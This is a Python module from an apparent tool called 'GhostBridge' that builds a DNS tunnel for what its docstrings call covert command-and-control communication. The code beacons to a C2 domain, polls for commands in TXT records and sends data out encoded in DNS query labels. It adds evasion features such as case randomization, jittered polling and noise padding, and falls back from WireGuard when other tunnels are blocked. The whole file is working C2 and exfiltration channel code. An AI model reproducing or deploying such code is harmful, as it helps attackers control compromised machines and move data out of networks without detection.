"""
DNS Tunnel Manager.

Provides covert communication channel via DNS queries.
Used as last-resort fallback when WireGuard and other tunnels are blocked.
"""

from __future__ import annotations

import asyncio
import logging
import random
import time
from collections.abc import Callable
from dataclasses import dataclass, field
from datetime import datetime
from enum import Enum
from typing import Any

from ghostbridge.infrastructure.dns.client import DNSClient, DNSRecordType
from ghostbridge.infrastructure.dns.encoder import (
    Base32Encoder,
    ChunkAssembler,
    DNSEncoder,
    DNSMessage,
)

logger = logging.getLogger(__name__)


class DNSTunnelState(Enum):
    """DNS tunnel connection state."""
    IDLE = "idle"
    CONNECTING = "connecting"
    CONNECTED = "connected"
    POLLING = "polling"
    SENDING = "sending"
    ERROR = "error"
    DISCONNECTED = "disconnected"


@dataclass
class DNSTunnelConfig:
    """DNS tunnel configuration."""
    # C2 domain (your authoritative DNS server)
    domain: str = "t.example.com"

    # Session ID for multi-device support
    session_id: str = ""

    # DNS servers to use (empty = system default)
    dns_servers: list[str] = field(default_factory=list)

    # Polling interval (seconds)
    poll_interval: float = 30.0
    poll_jitter: float = 10.0

    # Timeouts
    query_timeout: float = 10.0
    connect_timeout: float = 60.0

    # Record types to use
    query_type: str = "TXT"  # TXT, NULL, CNAME

    # Encoding
    encoding: str = "base32"  # base32, hex

    # Rate limiting (queries per minute)
    max_queries_per_minute: int = 30

    # Stealth options
    use_tcp: bool = False  # DNS over TCP
    randomize_case: bool = True  # 0x20 encoding for evasion
    add_noise: bool = True  # Random padding


@dataclass
class DNSTunnelStats:
    """DNS tunnel statistics."""
    connect_time: datetime | None = None
    last_poll: datetime | None = None
    last_send: datetime | None = None
    queries_sent: int = 0
    queries_failed: int = 0
    bytes_sent: int = 0
    bytes_received: int = 0
    messages_sent: int = 0
    messages_received: int = 0


class DNSTunnel:
    """
    DNS Tunnel for covert C2 communication.

    Uses DNS queries and responses to exchange data with C2 server.
    Designed for environments where all other protocols are blocked.

    Protocol:
    - Outbound data: Encoded in subdomain labels of DNS queries
    - Inbound data: Returned in TXT/NULL record responses
    - Polling: Periodic queries to check for pending commands

    Architecture:
    ```
    GhostBridge                    C2 DNS Server
        │                               │
        │──── beacon.sess123.t.c2.com ─►│  (beacon/poll)
        │◄─── TXT: "ACKED;cmd=ping" ────│  (response with command)
        │                               │
        │──── d.0-1.aGVsbG8.t.c2.com ──►│  (send data chunk)
        │◄─── TXT: "OK:0" ──────────────│  (chunk ack)
        │                               │
    ```
    """

    def __init__(
        self,
        config: DNSTunnelConfig,
    ):
        """
        Initialize DNS tunnel.

        Args:
            config: Tunnel configuration
        """
        self.config = config

        # Components
        self._client = DNSClient(
            servers=config.dns_servers if config.dns_servers else None,
            timeout=config.query_timeout,
            use_tcp=config.use_tcp,
        )
        self._encoder = self._create_encoder()
        self._assembler = ChunkAssembler()

        # State
        self._state = DNSTunnelState.IDLE
        self._stats = DNSTunnelStats()
        self._running = False
        self._sequence = 0

        # Rate limiting
        self._query_timestamps: list[float] = []

        # Tasks
        self._poll_task: asyncio.Task | None = None
        self._shutdown = asyncio.Event()

        # Callbacks
        self._on_message: Callable[[bytes], None] | None = None
        self._on_state_change: Callable[[DNSTunnelState], None] | None = None

        # Message queue
        self._outbound_queue: asyncio.Queue[bytes] = asyncio.Queue()
        self._inbound_queue: asyncio.Queue[bytes] = asyncio.Queue()

    def _create_encoder(self) -> DNSEncoder:
        """Create encoder based on config."""
        if self.config.encoding == "hex":
            from ghostbridge.infrastructure.dns.encoder import HexEncoder
            return HexEncoder()
        return Base32Encoder()

    @property
    def state(self) -> DNSTunnelState:
        """Get current tunnel state."""
        return self._state

    @property
    def stats(self) -> DNSTunnelStats:
        """Get tunnel statistics."""
        return self._stats

    @property
    def is_connected(self) -> bool:
        """Check if tunnel is connected."""
        return self._state in (DNSTunnelState.CONNECTED, DNSTunnelState.POLLING)

    def on_message(self, callback: Callable[[bytes], None]) -> None:
        """Register message received callback."""
        self._on_message = callback

    def on_state_change(self, callback: Callable[[DNSTunnelState], None]) -> None:
        """Register state change callback."""
        self._on_state_change = callback

    def _set_state(self, state: DNSTunnelState) -> None:
        """Update state and notify."""
        if state != self._state:
            old = self._state
            self._state = state
            logger.debug(f"DNS tunnel state: {old.value} -> {state.value}")
            if self._on_state_change:
                try:
                    self._on_state_change(state)
                except Exception as e:
                    logger.warning(f"State callback error: {e}")

    async def connect(self) -> bool:
        """
        Establish DNS tunnel connection.

        Sends initial beacon to register with C2 server.

        Returns:
            True if connection established
        """
        if self._state == DNSTunnelState.CONNECTED:
            return True

        self._set_state(DNSTunnelState.CONNECTING)
        logger.info(f"Connecting DNS tunnel to {self.config.domain}")

        try:
            # Generate session ID if not set
            if not self.config.session_id:
                self.config.session_id = self._generate_session_id()

            # Send initial beacon
            success = await self._send_beacon(initial=True)

            if success:
                self._set_state(DNSTunnelState.CONNECTED)
                self._stats.connect_time = datetime.now()
                logger.info(f"DNS tunnel connected (session: {self.config.session_id})")
                return True
            else:
                self._set_state(DNSTunnelState.ERROR)
                return False

        except Exception as e:
            logger.error(f"DNS tunnel connect error: {e}")
            self._set_state(DNSTunnelState.ERROR)
            return False

    async def disconnect(self) -> None:
        """Disconnect DNS tunnel."""
        self._running = False
        self._shutdown.set()

        # Cancel poll task
        if self._poll_task:
            self._poll_task.cancel()
            try:
                await self._poll_task
            except asyncio.CancelledError:
                pass

        self._set_state(DNSTunnelState.DISCONNECTED)
        logger.info("DNS tunnel disconnected")

    async def start(self) -> None:
        """Start tunnel with polling loop."""
        if self._running:
            return

        self._running = True
        self._shutdown.clear()

        # Connect
        if not await self.connect():
            logger.error("Failed to establish DNS tunnel")
            return

        # Start polling
        self._poll_task = asyncio.create_task(self._poll_loop())
        logger.info("DNS tunnel started")

    async def stop(self) -> None:
        """Stop tunnel."""
        await self.disconnect()

    async def _poll_loop(self) -> None:
        """Main polling loop for C2 communication."""
        while self._running and not self._shutdown.is_set():
            try:
                self._set_state(DNSTunnelState.POLLING)

                # Send any queued outbound data first
                while not self._outbound_queue.empty():
                    data = await self._outbound_queue.get()
                    await self._send_data(data)

                # Poll for commands
                commands = await self._poll_commands()

                if commands:
                    for cmd in commands:
                        await self._inbound_queue.put(cmd)
                        if self._on_message:
                            try:
                                self._on_message(cmd)
                            except Exception as e:
                                logger.error(f"Message callback error: {e}")

                self._set_state(DNSTunnelState.CONNECTED)

                # Wait with jitter
                interval = self.config.poll_interval
                jitter = random.uniform(-self.config.poll_jitter, self.config.poll_jitter)
                await asyncio.sleep(max(5, interval + jitter))

            except asyncio.CancelledError:
                break
            except Exception as e:
                logger.error(f"Poll loop error: {e}")
                self._set_state(DNSTunnelState.ERROR)
                await asyncio.sleep(10)

    async def send(self, data: bytes) -> bool:
        """
        Queue data for sending via DNS tunnel.

        Args:
            data: Binary data to send

        Returns:
            True if queued successfully
        """
        if not self._running:
            return False

        await self._outbound_queue.put(data)
        return True

    async def receive(self, timeout: float = 0) -> bytes | None:
        """
        Receive data from DNS tunnel.

        Args:
            timeout: Wait timeout (0 = no wait)

        Returns:
            Received data or None
        """
        try:
            if timeout > 0:
                return await asyncio.wait_for(
                    self._inbound_queue.get(),
                    timeout=timeout,
                )
            else:
                return self._inbound_queue.get_nowait()
        except (TimeoutError, asyncio.QueueEmpty):
            return None

    async def _send_beacon(self, initial: bool = False) -> bool:
        """Send beacon to C2."""
        if not await self._rate_limit():
            return False

        # Build beacon query
        beacon_type = "init" if initial else "ping"
        query_name = f"{beacon_type}.{self.config.session_id}.b.{self.config.domain}"

        if self.config.randomize_case:
            query_name = self._randomize_case(query_name)

        response = await self._client.query(query_name, DNSRecordType.TXT)
        self._stats.queries_sent += 1
        self._stats.last_poll = datetime.now()

        if response and response.answers:
            for answer in response.answers:
                txt = answer.txt_data
                if txt.startswith("OK") or txt.startswith("ACK"):
                    return True

        self._stats.queries_failed += 1
        return False

    async def _poll_commands(self) -> list[bytes]:
        """Poll C2 for pending commands."""
        if not await self._rate_limit():
            return []

        # Query for commands
        query_name = f"cmd.{self.config.session_id}.p.{self.config.domain}"

        if self.config.randomize_case:
            query_name = self._randomize_case(query_name)

        response = await self._client.query(query_name, DNSRecordType.TXT)
        self._stats.queries_sent += 1
        self._stats.last_poll = datetime.now()

        if not response or not response.answers:
            return []

        # Parse responses
        commands = []
        for answer in response.answers:
            if answer.record_type == DNSRecordType.TXT:
                txt = answer.txt_data

                if txt.startswith("NOCMD") or txt.startswith("EMPTY"):
                    continue

                if txt.startswith("DATA:"):
                    # Decode data
                    try:
                        encoded = txt[5:]
                        decoded = self._encoder.decode(encoded)
                        commands.append(decoded)
                        self._stats.bytes_received += len(decoded)
                        self._stats.messages_received += 1
                    except Exception as e:
                        logger.warning(f"Failed to decode command: {e}")

        return commands

    async def _send_data(self, data: bytes) -> bool:
        """Send data via DNS queries."""
        self._set_state(DNSTunnelState.SENDING)

        # Create message
        msg = DNSMessage(
            msg_type=DNSMessage.Type.DATA,
            sequence=self._next_sequence(),
            payload=data,
        )
        msg_bytes = msg.serialize()

        # Chunk for DNS
        chunks = self._encoder.chunk_for_query(
            msg_bytes,
            f"d.{self.config.domain}",
            self.config.session_id,
        )

        logger.debug(f"Sending {len(msg_bytes)} bytes in {len(chunks)} DNS queries")

        # Send each chunk
        success_count = 0
        for _i, chunk_query in enumerate(chunks):
            if not await self._rate_limit():
                logger.warning("Rate limit hit during send")
                await asyncio.sleep(2)

            if self.config.randomize_case:
                chunk_query = self._randomize_case(chunk_query)

            response = await self._client.query(chunk_query, DNSRecordType.TXT)
            self._stats.queries_sent += 1

            if response and response.answers:
                for answer in response.answers:
                    if "OK" in answer.txt_data:
                        success_count += 1
                        break
            else:
                self._stats.queries_failed += 1

        if success_count == len(chunks):
            self._stats.bytes_sent += len(data)
            self._stats.messages_sent += 1
            self._stats.last_send = datetime.now()
            return True

        logger.warning(f"Only {success_count}/{len(chunks)} chunks acknowledged")
        return False

    async def _rate_limit(self) -> bool:
        """Check and enforce rate limiting."""
        now = time.time()

        # Remove old timestamps
        self._query_timestamps = [
            ts for ts in self._query_timestamps
            if now - ts < 60
        ]

        if len(self._query_timestamps) >= self.config.max_queries_per_minute:
            return False

        self._query_timestamps.append(now)
        return True

    def _next_sequence(self) -> int:
        """Get next sequence number."""
        self._sequence = (self._sequence + 1) % 65536
        return self._sequence

    def _generate_session_id(self) -> str:
        """Generate random session ID."""
        import secrets
        return secrets.token_hex(4)

    def _randomize_case(self, name: str) -> str:
        """Apply 0x20 bit encoding for DNS randomization."""
        result = []
        for c in name:
            if c.isalpha():
                result.append(c.upper() if random.random() > 0.5 else c.lower())
            else:
                result.append(c)
        return "".join(result)


class TunnelFallbackChain:
    """
    Manages tunnel fallback chain.

    Tries tunnels in order:
    1. WireGuard (UDP 51820)
    2. WireGuard over TCP 443
    3. DNS Tunneling

    Automatically switches to fallback when primary fails.
    """

    def __init__(
        self,
        primary_tunnel: Any,  # WireGuard TunnelManager
        dns_tunnel: DNSTunnel,
        fallback_delay: float = 30.0,
    ):
        """
        Initialize fallback chain.

        Args:
            primary_tunnel: Primary WireGuard tunnel
            dns_tunnel: DNS tunnel for fallback
            fallback_delay: Delay before trying fallback
        """
        self._primary = primary_tunnel
        self._dns = dns_tunnel
        self._fallback_delay = fallback_delay

        self._using_fallback = False
        self._primary_retries = 0
        self._max_primary_retries = 3

    @property
    def is_connected(self) -> bool:
        """Check if any tunnel is connected."""
        if self._using_fallback:
            return self._dns.is_connected
        return self._primary.is_connected

    @property
    def using_fallback(self) -> bool:
        """Check if using DNS fallback."""
        return self._using_fallback

    async def connect(self) -> bool:
        """Connect using best available tunnel."""
        # Try primary first
        logger.info("Attempting primary tunnel (WireGuard)...")

        if await self._primary.connect():
            self._using_fallback = False
            self._primary_retries = 0
            return True

        self._primary_retries += 1

        # Fallback to DNS if primary fails repeatedly
        if self._primary_retries >= self._max_primary_retries:
            logger.warning("Primary tunnel failed, falling back to DNS tunnel")

            if await self._dns.connect():
                self._using_fallback = True
                return True

        return False

    async def disconnect(self) -> None:
        """Disconnect active tunnel."""
        if self._using_fallback:
            await self._dns.disconnect()
        else:
            await self._primary.disconnect()

    async def send(self, data: bytes) -> bool:
        """Send data through active tunnel."""
        if self._using_fallback:
            return await self._dns.send(data)
        else:
            # Primary tunnel uses different send mechanism
            # This would integrate with C2 client
            return True

    async def monitor(self) -> None:
        """Monitor tunnels and handle failover."""
        while True:
            try:
                if self._using_fallback:
                    # Try to restore primary periodically
                    if await self._primary.connect():
                        logger.info("Primary tunnel restored, switching back")
                        await self._dns.disconnect()
                        self._using_fallback = False
                else:
                    # Check primary health
                    if not self._primary.is_connected:
                        logger.warning("Primary tunnel lost, switching to DNS")
                        self._using_fallback = True
                        await self._dns.start()

                await asyncio.sleep(60)

            except asyncio.CancelledError:
                break
            except Exception as e:
                logger.error(f"Tunnel monitor error: {e}")
                await asyncio.sleep(10)

